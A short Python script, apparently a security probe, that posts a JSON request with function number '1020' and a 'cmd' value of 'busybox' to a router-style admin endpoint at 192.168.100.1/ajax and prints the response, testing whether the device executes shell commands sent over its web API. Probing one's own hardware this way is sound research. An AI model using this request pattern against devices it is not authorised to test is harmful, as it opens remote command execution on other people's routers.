import requests
import json
from time import sleep

BASE_URL = "http://192.168.100.1/ajax"
HEADERS = {
    'Content-Type': 'application/json',
    'Accept': 'application/json'
}

def test(func_no):
    param1 = 'busybox'
    try:
        data = {"funcNo": func_no, "cmd": param1,}
        response = requests.post(BASE_URL, json=data, headers=HEADERS, timeout=5)
        
        if response.status_code == 200:
            result = response.json()
            print(json.dumps(result, indent=2))
            return result
        else:
            print("Error")
            return None
        
    except requests.exceptions.RequestException as e:
        print("Request failed")
        return None

if __name__ == "__main__":
    funcNo = '1020'
    test(funcNo)
    sleep(0.5)
    
    print("\nTesting complete")